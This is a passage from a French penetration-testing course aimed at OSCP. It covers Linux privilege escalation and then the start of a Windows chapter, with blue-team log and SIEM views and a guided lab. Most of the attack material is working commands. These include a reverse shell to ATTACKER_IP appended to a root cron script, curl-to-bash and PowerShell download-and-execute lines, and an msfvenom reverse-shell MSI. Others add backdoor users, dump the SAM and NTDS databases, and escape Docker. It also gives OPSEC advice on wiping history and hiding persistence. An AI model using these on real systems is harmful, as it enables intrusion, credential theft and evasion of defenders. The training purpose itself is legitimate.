   - Recherche de vulnérabilités web classiques (RCE, LFI)
   
   ```bash
   curl http://127.0.0.1:8080/
   # Utiliser des outils comme nikto, gobuster via un tunnel ou proxy
   ```

#### Services système mal configurés

1. **NFS (Network File System)**
   - Si des partages NFS sont configurés avec l'option `no_root_squash`, un utilisateur `root` sur la machine cliente peut accéder aux fichiers partagés en tant que `root` sur le serveur
   
   ```bash
   # Vérifier les partages NFS
   showmount -e SERVER_IP
   cat /etc/exports # Sur le serveur NFS
   
   # Si /shared est partagé avec no_root_squash
   # Sur la machine cliente (en tant que root)
   mount -t nfs SERVER_IP:/shared /mnt/nfs
   cd /mnt/nfs
   # Créer un binaire SUID
   cp /bin/bash .
   chown root:root bash
   chmod u+s bash
   # Sur la machine serveur (en tant qu'utilisateur normal)
   cd /shared
   ./bash -p # Obtient un shell root
   ```

2. **Docker**
   - Si l'utilisateur fait partie du groupe `docker`, il peut monter le système de fichiers hôte dans un conteneur et obtenir un accès `root`
   
   ```bash
   # Vérifier si l'utilisateur est dans le groupe docker
   id | grep docker
   
   # Si oui, exécuter un conteneur privilégié
   docker run -v /:/mnt --rm -it alpine chroot /mnt sh
   ```

3. **Autres services (ex: SNMP, D-Bus)**
   - Des configurations incorrectes ou des vulnérabilités dans d'autres services système peuvent parfois être exploitées

### Exploitation des vulnérabilités du noyau (Kernel Exploits)

#### Identification des vulnérabilités

1. **Correspondance version noyau / exploits connus**
   - Utiliser des outils comme `linux-exploit-suggester` ou rechercher manuellement sur Exploit-DB, GitHub, etc., en fonction de `uname -a`
   
   ```bash
   ./linux-exploit-suggester.sh
   searchsploit Linux Kernel <version>
   ```

2. **Vérification des protections du noyau**
   - Certaines protections (SMEP, SMAP, KASLR) peuvent rendre l'exploitation plus difficile
   
   ```bash
   grep "smep" /proc/cpuinfo
   grep "smap" /proc/cpuinfo
   # KASLR est plus difficile à vérifier directement
   ```

#### Compilation et exécution des exploits

1. **Obtention du code source de l'exploit**
   - Télécharger le code source depuis la source (Exploit-DB, GitHub)
   
   ```bash
   searchsploit -m <exploit_id>
   wget <url_github_exploit.c>
   ```

2. **Compilation sur la machine cible (si possible)**
   - Nécessite `gcc` et les en-têtes du noyau (`kernel-headers`) installés sur la cible
   
   ```bash
   gcc exploit.c -o exploit -pthread # (-pthread souvent nécessaire)
   ```

3. **Compilation croisée (Cross-compilation)**
   - Si la cible n'a pas les outils de compilation, compiler sur la machine attaquante pour l'architecture cible
   
   ```bash
   # Exemple pour x86_64
   gcc exploit.c -o exploit_x64 -static # (-static pour inclure les bibliothèques)
   
   # Exemple pour ARM
   arm-linux-gnueabi-gcc exploit.c -o exploit_arm -static
   ```

4. **Transfert et exécution de l'exploit**
   - Transférer l'exploit compilé sur la cible (via `wget`, `scp`, serveur HTTP, etc.)
   - Rendre exécutable et lancer
   
   ```bash
   chmod +x exploit
   ./exploit
   ```

#### Précautions et risques

1. **Instabilité des exploits noyau**
   - Les exploits noyau peuvent être instables et provoquer un crash du système (Kernel Panic)
   - À utiliser en dernier recours et avec précaution

2. **Fiabilité des sources d'exploit**
   - Tester les exploits dans un environnement contrôlé avant de les utiliser sur une cible réelle
   - Se méfier des exploits provenant de sources non fiables

### Vue Blue Team / logs générés / alertes SIEM

#### Traces générées par l'énumération

1. **Logs d'exécution de commandes**
   - Utilisation intensive de commandes d'énumération (`find`, `grep`, `ps`, `netstat`)
   - Exécution de scripts d'énumération (LinEnum, LinPEAS)
   
   **Exemple de log (auditd) :**
   ```
   type=EXECVE msg=audit(1684177425.123:456): argc=3 a0="find" a1="/" a2="-writable"
   ```

2. **Logs d'accès fichiers**
   - Accès à des fichiers de configuration sensibles
   - Tentatives de lecture de fichiers non autorisés
   
   **Exemple de log (auditd) :**
   ```
   type=SYSCALL msg=audit(1684177425.123:457): arch=c000003e syscall=2 success=no exit=-13 a0=7ffc12345678 a1=0 a2=1b6 a3=0 items=1 ppid=123 pid=456 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm="cat" exe="/usr/bin/cat" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="access" path="/etc/shadow" dev=sda1 ino=12345 mode=0100640 ouid=0 ogid=42 rdev=0000 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0
   ```

#### Traces générées par l'exploitation des configurations

1. **Logs `sudo`**
   - Exécution de commandes via `sudo`
   - Utilisation de `sudo -l`
   - Tentatives d'exploitation de `LD_PRELOAD`
   
   **Exemple de log (/var/log/auth.log ou journald) :**
   ```
   May 15 14:23:45 server sudo: user : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh ; -quit
   ```

2. **Logs d'exécution de binaires SUID/SGID**
   - Exécution de binaires avec des privilèges élevés
   - Création de fichiers ou processus par des binaires SUID
   
   **Exemple de log (auditd) :**
   ```
   type=SYSCALL msg=audit(1684177425.123:458): arch=c000003e syscall=59 success=yes exit=0 a0=55555555abc0 a1=55555555abd8 a2=55555555abe8 a3=0 items=0 ppid=123 pid=456 auid=1000 uid=0 gid=1000 euid=0 suid=0 fsuid=0 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=1 comm="bash" exe="/usr/bin/bash" subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key="priv_esc"
   ```

3. **Logs Cron**
   - Exécution de tâches cron modifiées
   - Erreurs liées à l'injection de jokers
   
   **Exemple de log (/var/log/syslog ou journald) :**
   ```
   May 15 14:24:00 server CRON[1234]: (root) CMD (/path/to/script.sh)
   ```

#### Traces générées par l'exploitation des services

1. **Logs des services spécifiques**
   - Logs de connexion aux bases de données
   - Logs d'accès aux serveurs web locaux
   - Logs NFS indiquant des montages ou des accès fichiers
   - Logs Docker indiquant la création de conteneurs

2. **Logs réseau**
   - Connexions vers des services locaux (127.0.0.1)
   - Trafic NFS ou Docker suspect

#### Traces générées par les exploits noyau

1. **Logs système (dmesg)**
   - Messages d'erreur du noyau
   - Traces de crash (Kernel Panic) si l'exploit échoue
   
   **Exemple de log (dmesg) :**
   ```
   [12345.678901] general protection fault: 0000 [#1] SMP PTI
   [12345.678902] CPU: 0 PID: 1234 Comm: exploit Not tainted 5.4.0-100-generic #113-Ubuntu
   [12345.678903] RIP: 0010:exploited_function+0x1a/0x20
   ```

2. **Logs d'exécution de processus**
   - Exécution de l'exploit compilé
   - Création de processus `root` par l'exploit

#### Alertes SIEM typiques

**Alerte d'abus de `sudo` :**
```
[ALERT] Suspicious Sudo Command Execution
Host: server01
User: user
Time: 2023-05-15 14:23:45
Details: User executed command known for sudo privilege escalation (e.g., find, nmap, awk) via sudo
Severity: High
```

**Alerte d'exploitation SUID :**
```
[ALERT] Potential SUID Binary Exploitation
Host: server01
User: user
Time: 2023-05-15 14:24:12
Details: SUID binary executed and spawned a root shell or performed suspicious file operations
Binary: /usr/bin/find
Severity: High
```

**Alerte de modification de tâche Cron :**
```
[ALERT] Cron Job Modification Detected
Host: server01
User: user
Time: 2023-05-15 14:35:27
Details: File associated with a root cron job was modified by a non-root user
File: /path/to/script.sh
Severity: Critical
```

**Alerte d'exploitation de capacité :**
```
[ALERT] Linux Capability Abuse Detected
Host: server01
User: user
Time: 2023-05-15 14:36:15
Details: Process executed with dangerous capabilities (e.g., cap_setuid) attempting privilege escalation
Process: /usr/bin/python
Severity: High
```

**Alerte d'exploit noyau :**
```
[ALERT] Potential Kernel Exploit Attempt
Host: server01
User: user
Time: 2023-05-15 14:40:05
Details: Execution of unknown binary followed by root process creation or kernel error messages detected
Severity: Critical
```

### Pièges classiques et erreurs à éviter

#### Erreurs d'énumération

1. **Énumération incomplète**
   - Oubli de vérifier certains vecteurs (capacités, timers systemd)
   - Utilisation d'un seul script d'énumération
   - Négligence des fichiers cachés ou des configurations spécifiques
   
   **Solution :** Utiliser plusieurs scripts d'énumération, effectuer des vérifications manuelles approfondies, adapter l'énumération au contexte.

2. **Trop de bruit**
   - Lancement de scans ou de recherches massives générant des logs excessifs
   - Utilisation d'outils bruyants sans précaution
   
   **Solution :** Cibler l'énumération, utiliser des options pour limiter le bruit (`2>/dev/null`), espacer les commandes.

#### Erreurs d'exploitation

1. **Mauvaise cible d'exploit**
   - Utilisation d'un exploit noyau pour la mauvaise version ou architecture
   - Tentative d'exploitation d'une configuration qui n'est pas réellement vulnérable
   
   **Solution :** Vérifier précisément la version du noyau et l'architecture, confirmer la vulnérabilité avant l'exploitation.

2. **Exploit instable ou malveillant**
   - Utilisation d'un exploit noyau provoquant un crash
   - Téléchargement d'exploits depuis des sources non fiables
   
   **Solution :** Tester les exploits dans un environnement contrôlé, privilégier les exploits de sources reconnues, utiliser les exploits noyau en dernier recours.

3. **Oubli des protections**
   - Ignorance des protections comme AppArmor ou SELinux
   - Négligence des protections du noyau (SMEP, SMAP)
   
   **Solution :** Vérifier les mécanismes de sécurité en place (getenforce, aa-status), adapter les techniques d'exploitation.

#### Erreurs post-exploitation

1. **Nettoyage insuffisant**
   - Laisser des outils, scripts ou fichiers temporaires sur la cible
   - Ne pas effacer l'historique des commandes
   - Laisser des processus malveillants en cours d'exécution
   
   **Solution :** Mettre en place une routine de nettoyage systématique, utiliser des répertoires temporaires dédiés, effacer l'historique.

2. **Persistance trop évidente**
   - Ajout d'utilisateurs `root`
   - Modification de fichiers système critiques
   - Installation de backdoors évidentes
   
   **Solution :** Utiliser des techniques de persistance plus discrètes (clés SSH, tâches cron cachées, etc.).

### OPSEC Tips : PrivEsc discrète

#### Techniques de base

1. **Limitation du bruit d'énumération**
   ```bash
   # Préférer les recherches ciblées
   find /etc/ -name "*.conf" -user root -group root -perm -o+w -ls 2>/dev/null
   
   # Rediriger les erreurs
   grep -i password /etc/* -R 2>/dev/null
   ```

2. **Utilisation d'outils intégrés**
   ```bash
   # Utiliser les commandes système plutôt que des scripts externes si possible
   # Exemple: au lieu de LinEnum, utiliser une série de commandes manuelles ciblées
   id; uname -a; sudo -l; ps aux | grep root; ss -lntp
   ```

3. **Nettoyage immédiat**
   ```bash
   # Supprimer les outils après utilisation
   rm ./linpeas.sh
   
   # Effacer l'historique après des commandes sensibles
   history -c
   ```

#### Techniques avancées

1. **Exécution en mémoire**
   ```bash
   # Télécharger et exécuter des scripts sans les écrire sur le disque
   curl -s https://example.com/script.sh | bash
   wget -qO- https://example.com/script.sh | bash
   
   # Utiliser des techniques d'exécution de binaires en mémoire (plus complexe)
   ```

2. **Modification minimale**
   ```bash
   # Préférer l'exploitation de configurations existantes aux modifications
   # Exemple: Abuser d'un sudo existant plutôt que de modifier /etc/sudoers
   
   # Utiliser des liens symboliques plutôt que de copier des fichiers
   ln -s /etc/shadow /tmp/shadowlink
   ```

3. **Masquage des processus et connexions**
   - Renommer les processus suspects
   - Utiliser des techniques de tunneling pour masquer le trafic réseau
   - Utiliser des techniques anti-debugging

#### Script OPSEC : Énumération discrète

```bash
#!/bin/bash
# Script d'énumération Linux discrète avec considérations OPSEC

LOG_FILE="/tmp/enum_$(date +%Y%m%d%H%M%S).log"
ERROR_LOG="/tmp/enum_error.log"
MAX_FIND_DEPTH=5

# Redirection de stdout et stderr vers les logs
exec > >(tee -a "$LOG_FILE") 2> >(tee -a "$ERROR_LOG" >&2)

log() {
    echo "[$(date "+%Y-%m-%d %H:%M:%S")] [INFO] $1"
}

log_warn() {
    echo "[$(date "+%Y-%m-%d %H:%M:%S")] [WARN] $1"
}

log_success() {
    echo "[$(date "+%Y-%m-%d %H:%M:%S")] [SUCCESS] $1"
}

# Fonction pour introduire un délai
delay() {
    sleep $(awk -v min=1 -v max=3 'BEGIN{srand(); print min+rand()*(max-min)}')
}

log "Starting discrete enumeration"

# --- Informations système --- 
log "Gathering basic system info..."
echo "--- WHOAMI & ID ---" ; id
delay
echo "--- UNAME ---" ; uname -a
delay
echo "--- OS RELEASE ---" ; cat /etc/os-release 2>/dev/null
delay
echo "--- SUDO CHECK ---" ; sudo -nl 2>/dev/null || log_warn "Cannot run sudo -nl"
delay

# --- Fichiers intéressants --- 
log "Searching for interesting files (limited depth)..."
echo "--- SUID FILES (depth $MAX_FIND_DEPTH) ---"
find / -maxdepth $MAX_FIND_DEPTH -type f -perm -4000 -ls 2>/dev/null
delay
echo "--- WRITABLE FILES in /etc (depth 1) ---"
find /etc/ -maxdepth 1 -writable -type f -ls 2>/dev/null
delay
echo "--- WRITABLE DIRS in / (depth 1, world writable) ---"
find / -maxdepth 1 -perm -o+w -type d -ls 2>/dev/null
delay
echo "--- SSH KEYS ---"
ls -al ~/.ssh/ 2>/dev/null
delay

# --- Processus et Réseau --- 
log "Checking processes and network..."
echo "--- ROOT PROCESSES ---"
ps -eo user,pid,cmd | grep '^root'
delay
echo "--- LISTENING PORTS (TCP/UDP) ---"
ss -tulnp 2>/dev/null || netstat -tulnp 2>/dev/null
delay

# --- Tâches planifiées --- 
log "Checking scheduled tasks..."
echo "--- CRONTAB --- " ; cat /etc/crontab 2>/dev/null
delay
echo "--- CRON.D --- " ; ls -al /etc/cron.d/ 2>/dev/null
delay

# --- Capacités --- 
log "Checking capabilities..."
echo "--- CAPABILITIES ---"
if command -v getcap &> /dev/null; then
    getcap -r /usr/bin/ 2>/dev/null
else
    log_warn "getcap command not found"
fi
delay

log "Discrete enumeration finished. Check logs: $LOG_FILE and $ERROR_LOG"

# --- Nettoyage --- 
log "Cleaning up history (optional)..."
# history -c # Décommenter avec précaution

# Redirection de la sortie vers la console
exec > /dev/tty 2>&1

echo "Enumeration complete. Logs saved."
```

### Points clés

- L'élévation de privilèges Linux commence par une énumération système approfondie.
- Les configurations incorrectes courantes incluent l'abus de `sudo`, les fichiers SUID/SGID mal configurés, et les tâches cron non sécurisées.
- Les capacités Linux peuvent offrir des privilèges spécifiques sans nécessiter SUID `root`.
- Les services locaux (bases de données, web) et les services système (NFS, Docker) peuvent être des vecteurs d'exploitation.
- Les vulnérabilités du noyau (Kernel Exploits) sont puissantes mais potentiellement instables et doivent être utilisées avec précaution.
- Les équipes défensives peuvent détecter la PrivEsc via les logs d'exécution, d'accès fichiers, `sudo`, cron, et les logs système/noyau.
- Une approche discrète implique de limiter le bruit, d'utiliser des outils intégrés, de privilégier l'exécution en mémoire et de nettoyer les traces.

### Mini-quiz (3 QCM)

1. **Quelle commande permet de trouver tous les fichiers avec le bit SUID activé sur un système Linux ?**
   - A) `find / -perm -u+s -ls`
   - B) `find / -type f -perm -4000 -ls`
   - C) `find / -suid -print`
   - D) `ls -alR / | grep 'rws'`

   *Réponse : B*

2. **Si un utilisateur peut exécuter la commande `find` via `sudo`, comment peut-il obtenir un shell root ?**
   - A) `sudo find / -exec /bin/bash`
   - B) `sudo find . -exec /bin/sh \; -quit`
   - C) `sudo find / -perm -4000 -exec /bin/sh \;`
   - D) `sudo find --interactive`

   *Réponse : B*

3. **Quel script est spécifiquement conçu pour suggérer des exploits noyau basés sur la version du noyau Linux ?**
   - A) LinEnum.sh
   - B) LinPEAS.sh
   - C) LES (Linux Exploit Suggester)
   - D) GTFOBins

   *Réponse : C*

### Lab/Exercice guidé : PrivEsc via SUID et Cron

#### Objectif
Identifier et exploiter deux vecteurs d'élévation de privilèges courants : un binaire SUID vulnérable et une tâche cron mal configurée.

#### Prérequis
- Machine Linux vulnérable (ex: une VM de type CTF simple)
- Accès initial avec des privilèges utilisateur limités

#### Étapes

1. **Énumération initiale**

```bash
# Sur la machine cible
whoami
id
sudo -l # Vérifier les privilèges sudo

# Recherche de binaires SUID
find / -type f -perm -4000 -ls 2>/dev/null > /tmp/suid_files.txt

# Recherche de tâches cron
ls -al /etc/cron*
cat /etc/crontab
ls -al /etc/cron.d/
ls -al /var/spool/cron/crontabs/

# Analyser les résultats
cat /tmp/suid_files.txt
# Rechercher des binaires suspects ou connus pour être exploitables (ex: find, nmap, cp, etc.)

# Analyser les tâches cron pour des scripts modifiables ou des commandes non sécurisées
```

2. **Exploitation du binaire SUID**

```bash
# Supposons que 'find' soit SUID root (trouvé dans /tmp/suid_files.txt)
# Vérifier avec ls -al $(which find)

# Utiliser GTFOBins pour trouver la méthode d'exploitation
# https://gtfobins.github.io/gtfobins/find/

# Exécuter la commande d'exploitation
find . -exec /bin/bash -p \; -quit

# Vérifier les privilèges
whoami # Devrait afficher 'root'
id # Devrait montrer uid=0(root)

# Quitter le shell root obtenu
exit
```

3. **Exploitation de la tâche Cron**

```bash
# Supposons qu'une tâche cron exécute /usr/local/bin/backup.sh toutes les minutes
# Et que ce script est modifiable par l'utilisateur
# Tâche Cron: * * * * * root /usr/local/bin/backup.sh

# Vérifier les permissions du script
ls -al /usr/local/bin/backup.sh

# Si modifiable, ajouter une commande pour un reverse shell
# Sur la machine attaquante, démarrer un listener netcat
# nc -lvnp 4444

# Sur la machine cible, modifier le script
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /usr/local/bin/backup.sh

# Attendre une minute pour que la tâche cron s'exécute
# Un shell root devrait apparaître sur le listener netcat de l'attaquant

# Sur le shell obtenu via netcat
whoami
id

# Nettoyage (important!)
# Supprimer la ligne ajoutée au script
sed -i '$ d' /usr/local/bin/backup.sh
```

#### Vue Blue Team

1. **Détection de l'exploitation SUID**
   - Logs d'audit (auditd) montrant l'exécution du binaire SUID (`find`) suivi de l'exécution de `/bin/bash` avec `euid=0`.
   - Surveillance des binaires SUID connus pour être dangereux.

2. **Détection de l'exploitation Cron**
   - Surveillance de l'intégrité des fichiers (FIM) détectant la modification de `/usr/local/bin/backup.sh`.
   - Logs Cron montrant l'exécution du script.
   - Logs réseau montrant la connexion sortante vers `ATTACKER_IP:4444` initiée par un processus `root` (`bash`).

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir identifié un binaire SUID potentiellement exploitable.
- Avoir utilisé GTFOBins pour trouver une méthode d'exploitation et obtenu un shell `root`.
- Avoir identifié une tâche cron exécutant un script modifiable.
- Avoir modifié le script pour obtenir un reverse shell `root`.
- Comprendre l'importance de l'énumération pour trouver ces vecteurs.
- Apprécier comment ces activités peuvent être détectées.
# PARTIE III : COMPÉTENCES OSCP AVANCÉES (+ OPSEC NIVEAU 3)

## Chapitre 17 : PrivEsc Windows

### Introduction : Pourquoi ce thème est important

L'élévation de privilèges (Privilege Escalation, PrivEsc) sur les systèmes Windows est une compétence fondamentale pour tout pentester avancé. Après avoir obtenu un accès initial avec des privilèges limités, l'objectif est d'obtenir des privilèges plus élevés, idéalement ceux d'un administrateur local ou de domaine, pour prendre le contrôle total du système ou du réseau. Ce chapitre explore diverses techniques d'élévation de privilèges sur Windows, allant des configurations incorrectes courantes aux vulnérabilités du système, en passant par l'exploitation de services et d'applications. La maîtrise de ces techniques est essentielle pour réussir l'examen OSCP et pour mener à bien des pentests réalistes, car l'accès administrateur ouvre la voie à la persistance, au mouvement latéral et à l'exfiltration de données sensibles.

### Énumération initiale

Une énumération approfondie est la clé pour identifier les vecteurs potentiels d'élévation de privilèges. Il est essentiel de collecter autant d'informations que possible sur le système cible.

#### Informations système de base

1. **Version du système et architecture**
   - Identifier la version de Windows et l'architecture peut révéler des vulnérabilités connues
   - Comprendre les correctifs de sécurité installés ou manquants
   
   ```powershell
   # Informations système de base
   systeminfo
   
   # Version de Windows et architecture
   [System.Environment]::OSVersion.Version
   [Environment]::Is64BitOperatingSystem
   
   # Correctifs de sécurité installés
   wmic qfe get Caption,Description,HotFixID,InstalledOn
   ```

2. **Utilisateur actuel et privilèges**
   - Connaître l'utilisateur actuel et ses groupes
   - Vérifier les privilèges spéciaux
   
   ```powershell
   # Utilisateur actuel
   whoami
   
   # Groupes et privilèges
   whoami /all
   
   # Vérifier les privilèges spécifiques
   whoami /priv
   ```

3. **Informations réseau**
   - Identifier les interfaces réseau, les connexions actives et les services en écoute
   - Peut révéler des services mal configurés ou des chemins de communication
   
   ```powershell
   # Interfaces réseau
   ipconfig /all
   
   # Connexions actives et ports en écoute
   netstat -ano
   
   # Routes réseau
   route print
   
   # Hôtes connus
   type C:\Windows\System32\drivers\etc\hosts
   ```

#### Recherche de fichiers et de configurations sensibles

1. **Fichiers de configuration et mots de passe**
   - Recherche de mots de passe en clair, de clés, de configurations sensibles
   
   ```powershell
   # Recherche de fichiers contenant "password"
   findstr /si password *.txt *.ini *.config *.xml *.ps1 *.bat
   
   # Recherche dans les fichiers de configuration courants
   type C:\Windows\Panther\Unattend.xml 2>nul
   type C:\Windows\Panther\Unattend\Unattend.xml 2>nul
   type C:\Windows\System32\Sysprep\Unattend.xml 2>nul
   type C:\Windows\System32\Sysprep\Panther\Unattend.xml 2>nul
   
   # Recherche dans le registre
   reg query HKLM /f password /t REG_SZ /s
   reg query HKCU /f password /t REG_SZ /s
   ```

2. **Fichiers accessibles en écriture par l'utilisateur actuel**
   - Identifier les fichiers ou répertoires importants modifiables par l'utilisateur
   - Peut permettre de modifier des scripts exécutés par des utilisateurs privilégiés
   
   ```powershell
   # Recherche de fichiers modifiables dans Program Files
   icacls "C:\Program Files\*" 2>nul | findstr "(M)" | findstr "Everyone BUILTIN\Users"
   icacls "C:\Program Files (x86)\*" 2>nul | findstr "(M)" | findstr "Everyone BUILTIN\Users"
   
   # Recherche de fichiers modifiables dans System32
   icacls "C:\Windows\System32\*" 2>nul | findstr "(M)" | findstr "Everyone BUILTIN\Users"
   ```

3. **Informations d'identification stockées**
   - Recherche d'informations d'identification stockées dans Windows Credential Manager
   - Recherche de fichiers de configuration RDP, VPN, etc.
   
   ```powershell
   # Afficher les informations d'identification stockées
   cmdkey /list
   
   # Recherche de fichiers de configuration RDP
   dir /s /b %USERPROFILE%\*.rdp
   
   # Recherche de fichiers de configuration VPN
   dir /s /b %USERPROFILE%\*.pcf
   ```

#### Énumération des processus et services

1. **Processus en cours d'exécution**
   - Identifier les processus exécutés par des utilisateurs privilégiés
   - Peut révéler des services vulnérables ou des applications mal configurées
   
   ```powershell
   # Liste des processus
   tasklist /v
   
   # Liste des processus avec propriétaire
   wmic process get caption,executablepath,commandline
   
   # Processus PowerShell plus détaillé
   Get-Process | Select-Object Name, Path, Company, CPU
   ```

2. **Services Windows**
   - Identifier les services mal configurés ou vulnérables
   - Vérifier les permissions sur les exécutables des services
   
   ```powershell
   # Liste des services
   sc query
   
   # Informations détaillées sur les services
   wmic service get name,displayname,pathname,startmode
   
   # Services avec PowerShell
   Get-Service | Where-Object {$_.Status -eq "Running"}
   
   # Vérifier les permissions des exécutables de service
   $services = Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike "*system32*"}
   foreach ($service in $services) {
       $path = $service.PathName.Trim('"')
       $path = $path.Split(" ")[0]
       Write-Host "Service: " $service.Name
       Write-Host "Path: " $path
       try { icacls $path } catch { Write-Host "Cannot access path" }
       Write-Host "------------------------"
   }
   ```

3. **Tâches planifiées**
   - Identifier les tâches planifiées exécutées par des utilisateurs privilégiés
   - Vérifier les permissions sur les scripts ou exécutables associés
   
   ```powershell
   # Liste des tâches planifiées
   schtasks /query /fo LIST /v
   
   # Tâches planifiées avec PowerShell
   Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object TaskName,TaskPath,State
   ```

#### Utilisation de scripts d'énumération automatisée

Plusieurs scripts automatisent le processus d'énumération et aident à identifier rapidement les vecteurs potentiels.

1. **PowerUp.ps1**
   - Script PowerShell pour identifier les vecteurs d'élévation de privilèges courants
   
   ```powershell
   # Télécharger et exécuter en mémoire
   IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
   Invoke-AllChecks
   ```

2. **Sherlock.ps1**
   - Script PowerShell pour identifier les vulnérabilités de correctifs manquants
   
   ```powershell
   # Télécharger et exécuter en mémoire
   IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1')
   Find-AllVulns
   ```

3. **WinPEAS**
   - Outil complet d'énumération pour Windows, avec mise en évidence des résultats intéressants
   
   ```powershell
   # Télécharger et exécuter
   # (Nécessite de télécharger le binaire au préalable)
   .\winPEASx64.exe
   ```

4. **Seatbelt**
   - Outil d'audit de sécurité et d'énumération pour Windows
   
   ```powershell
   # Télécharger et exécuter
   # (Nécessite de télécharger le binaire au préalable)
   .\Seatbelt.exe -group=all
   ```

### Exploitation des configurations incorrectes

#### Privilèges utilisateur spéciaux

1. **SeImpersonatePrivilege et SeAssignPrimaryTokenPrivilege**
   - Ces privilèges permettent d'usurper l'identité d'autres utilisateurs
   - Exploitables via des techniques comme Potato (Juicy Potato, Rogue Potato, etc.)
   
   ```powershell
   # Vérifier si l'utilisateur a ces privilèges
   whoami /priv | findstr /i "seimpersonate seassignprimarytoken"
   
   # Exploitation avec JuicyPotato (exemple)
   # (Nécessite de télécharger JuicyPotato.exe au préalable)
   .\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user hacker Password123 /add" -t *
   ```

2. **SeBackupPrivilege et SeRestorePrivilege**
   - Permettent de lire et écrire n'importe quel fichier, indépendamment des ACL
   - Peuvent être utilisés pour extraire des hachages SAM ou modifier des fichiers système
   
   ```powershell
   # Vérifier si l'utilisateur a ces privilèges
   whoami /priv | findstr /i "sebackup serestore"
   
   # Exploitation pour extraire SAM et SYSTEM
   reg save HKLM\SAM sam.hive
   reg save HKLM\SYSTEM system.hive
   
   # Utiliser diskshadow pour créer une copie de la base de registre
   (echo set context persistent nowriters; echo add volume c: alias someAlias; echo create; echo expose %someAlias% z:; echo exec "cmd.exe" /c copy z:\windows\ntds\ntds.dit C:\temp\ntds.dit; echo delete shadows volume %someAlias%; echo reset) > shadow.txt
   diskshadow /s shadow.txt
   ```

3. **SeTakeOwnershipPrivilege**
   - Permet de prendre possession de n'importe quel objet (fichier, clé de registre, etc.)
   - Peut être utilisé pour modifier des fichiers système ou des services
   
   ```powershell
   # Vérifier si l'utilisateur a ce privilège
   whoami /priv | findstr /i "setakeownership"
   
   # Exploitation pour prendre possession d'un fichier
   takeown /f C:\Windows\System32\utilman.exe
   icacls C:\Windows\System32\utilman.exe /grant username:F
   copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe /Y
   ```

#### Services Windows vulnérables

1. **Permissions de service incorrectes**
   - Services dont les binaires peuvent être modifiés par l'utilisateur actuel
   - Services dont les paramètres peuvent être modifiés
   
   ```powershell
   # Identifier les services vulnérables avec PowerUp
   Invoke-ServiceAbuse -Name "VulnerableService"
   
   # Vérification manuelle des permissions
   $serviceName = "VulnerableService"
   $service = Get-WmiObject -Class Win32_Service -Filter "Name='$serviceName'"
   $path = $service.PathName.Trim('"')
   icacls $path
   
   # Exploitation (si modifiable)
   # Remplacer le binaire par un malveillant ou ajouter un utilisateur
   copy C:\path\to\malicious.exe $path /Y
   # Redémarrer le service
   Restart-Service $serviceName
   ```

2. **Unquoted Service Paths**
   - Services dont le chemin d'exécution n'est pas entre guillemets et contient des espaces
   - Windows cherchera à exécuter chaque combinaison possible du chemin
   
   ```powershell
   # Identifier les services avec des chemins non cités
   wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
   
   # Exploitation (exemple)
   # Si le chemin est C:\Program Files\Vulnerable Service\service.exe
   # Windows essaiera d'exécuter:
   # 1. C:\Program.exe
   # 2. C:\Program Files\Vulnerable.exe
   # 3. C:\Program Files\Vulnerable Service\service.exe
   
   # Si l'utilisateur peut écrire dans C:\Program Files\
   copy C:\path\to\malicious.exe "C:\Program Files\Vulnerable.exe"
   # Redémarrer le service
   Restart-Service "VulnerableService"
   ```

3. **DLL Hijacking**
   - Services ou applications qui chargent des DLL de manière non sécurisée
   - Si une DLL est recherchée dans un répertoire modifiable, elle peut être remplacée
   
   ```powershell
   # Identifier les DLL manquantes avec Process Monitor
   # (Nécessite d'exécuter Procmon.exe et de filtrer sur "Result is NAME NOT FOUND" et "Path ends with .dll")
   
   # Exploitation (exemple)
   # Créer une DLL malveillante
   #include <windows.h>
   BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
       if (fdwReason == DLL_PROCESS_ATTACH) {
           system("cmd.exe /c net user hacker Password123 /add");
       }
       return TRUE;
   }
   
   # Compiler la DLL
   # Placer la DLL dans le répertoire où elle est recherchée
   copy malicious.dll C:\path\to\vulnerable\directory\missing.dll
   # Redémarrer l'application ou le service
   ```

#### Registre Windows

1. **AlwaysInstallElevated**
   - Politique qui permet aux utilisateurs non privilégiés d'installer des packages MSI avec des privilèges SYSTEM
   
   ```powershell
   # Vérifier si la politique est activée
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   
   # Si les deux clés sont définies à 1, exploitation possible
   # Créer un package MSI malveillant
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o malicious.msi
   
   # Installer le package MSI
   msiexec /quiet /qn /i malicious.msi
   ```

2. **AutoRun et StartUp**
   - Clés de registre et dossiers qui exécutent automatiquement des programmes au démarrage
   - Si modifiables, peuvent être utilisés pour l'élévation de privilèges
   
   ```powershell
   # Vérifier les clés AutoRun
   reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   
   # Vérifier les dossiers StartUp
   dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
   dir "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
   
   # Exploitation (si modifiable)
